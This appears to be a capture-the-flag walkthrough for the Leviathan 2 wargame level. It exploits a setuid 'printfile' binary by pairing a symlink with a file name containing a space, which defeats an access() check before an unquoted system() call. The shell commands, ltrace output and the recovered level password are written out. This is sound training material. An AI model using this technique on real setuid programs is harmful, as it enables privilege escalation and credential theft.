# Leviathan 2 - Walkthrough

inside the home directory there is a setuid elf called `printfile`, owned by leviathan3.
It requires an argument, so I gave it `/etc/leviathan_pass/leviathan3` and:
`leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3`
`You cant have that file...``

Welll...
Running ltrace proves us that it is actually running a `/bin/cat`, and runs `access` right before.
What is `access`?

from the man of `access`:
 Warning:  Using  these calls to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole,
       because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason, the use  of  this  system
       call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID
       and then call open(2).)
	   
Interesting.. There is a security hole here.

Let's do a tmux.
in one terminal, we'll create a file `/tmp/leviathan2/my_file` and grant it full permissions.
in the second terminal, we'll run gdb with `./printfile /etc/leviathan2/my_file`, and put a breakpoint after a successful access check.
Then, we will delete `/tmp/leviathan2/my_file` and create a symlink instead to `/etc/leviathan_pass_leviathan3`:
`ln -s /etc/leviathan_pass/leviathan3 /tmp/leviathan2/my_file`

failed :(

Let's try another thing. `access` checks the full path, while `cat` checks the first argument.
So we'll create a file filled with space, where the first one is a symlink with full permissions to `/etc/leviathan_pass/leviathan3`:

leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/leviathan2/my
leviathan2@leviathan:~$ ls /tmp/leviathan2
my  my file
leviathan2@leviathan:~$ ls -la /tmp/leviathan2
ls: cannot access '/tmp/leviathan2': No such file or directory
leviathan2@leviathan:~$ ls -la /tmp/leviathan
ls: cannot access '/tmp/leviathan': No such file or directory
leviathan2@leviathan:~$ ls -la /tmp/leviathan2
ls: cannot access '/tmp/leviathan2': No such file or directory
leviathan2@leviathan:~$ mkdir /tmp/leviathan2 && touch /tmp/leviathan2/my\ file
leviathan2@leviathan:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/leviathan2/my
leviathan2@leviathan:~$ ls -la /tmp/leviathan2
total 268
drwxr-sr-x   2 leviathan2 root   4096 Dec 16 19:20 .
drwxrws-wt 194 root       root 266240 Dec 16 19:20 ..
lrwxrwxrwx   1 leviathan2 root     30 Dec 16 19:20 my -> /etc/leviathan_pass/leviathan3
-rw-r--r--   1 leviathan2 root      0 Dec 16 19:20 my file
leviathan2@leviathan:~$ ./printfile /tmp/leviathan2/my\ file
Ahdiemoo1j 

WORKED! 

leviathan2@leviathan:~$ ltrace ./printfile /tmp/leviathan2/my\ file
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("/tmp/leviathan2/my file", 4)                                                                  = 0
snprintf("/bin/cat /tmp/leviathan2/my file"..., 511, "/bin/cat %s", "/tmp/leviathan2/my file")        = 32
geteuid()                                                                                             = 12002
geteuid()                                                                                             = 12002
setreuid(12002, 12002)                                                                                = 0
system("/bin/cat /tmp/leviathan2/my file".../bin/cat: /tmp/leviathan2/my: Permission denied
/bin/cat: file: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                = 256
+++ exited (status 0) +++